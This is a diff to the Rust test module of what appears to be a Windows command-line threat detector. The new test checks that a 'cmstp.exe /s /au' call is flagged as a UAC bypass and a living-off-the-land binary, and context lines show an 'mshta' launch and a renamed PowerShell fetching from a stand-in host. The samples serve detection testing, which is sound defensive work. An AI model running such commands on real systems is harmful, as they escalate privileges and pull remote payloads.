@@ -12498,8 +12498,10 @@ mshta dropped.hta"#,
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod esentutl_tests {
+    use crate::analyze;
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
     use crate::traits::Trait;
-    use crate::{analyze, Config};
 
     #[test]
     fn esentutl_copy_windows_util_emits_manipulation_trait() {
@@ -12546,6 +12548,26 @@ C:\Users\Public\psh.pif -NoProfile -Command "iwr https://esentutl-alias.example/
             }),
             "esentutl-copied PowerShell alias command was not scanned: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn cmstp_au_direct_command_emits_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
+            "cmstp /au direct command was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "cmstp")),
+            "cmstp /au direct command was not marked as LOLBAS: {:?}",
+            env.traits
         );
     }
 }
